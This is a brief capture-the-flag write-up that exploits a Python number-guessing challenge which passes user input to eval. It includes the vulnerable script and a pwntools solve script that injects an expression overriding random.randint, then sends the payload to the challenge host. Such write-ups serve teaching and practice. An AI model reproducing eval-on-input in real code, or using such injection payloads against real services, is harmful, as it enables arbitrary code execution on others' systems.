# Eval is Evil

This challenge provide us this python script:

```py
import random

def main():
    print("Let's play a game, I am thinking of a number between 0 and", 2 ** 64, "\n")
    try:
        guess = eval(input("What is the number?: "))
    except:
        guess = 0
    correct = random.randint(0, 2**64)
    if (guess == correct):
        print("\nCorrect! You won the flag!")
        flag = open("flag.txt", "r").readline()
        print(flag)
    else:
        print("\nYou lost lol")

main()
```

Here, we need to exploit the usage of `eval`. We will then override `random.randint`.

## solve.py:

```py
from pwn import *

# We use a tuple to execute multiple expressions.
# 1. override random.randint to always return 42
# 2. We guess 42
payload = '(setattr(random, "randint", lambda a,b: 42), 42)[1]'

r = remote("evalisevil.kctf-453514-codelab.kctf.cloud", 1337)
r.recvuntil("What is the number?: ")
r.sendline(payload)
r.interactive()
```
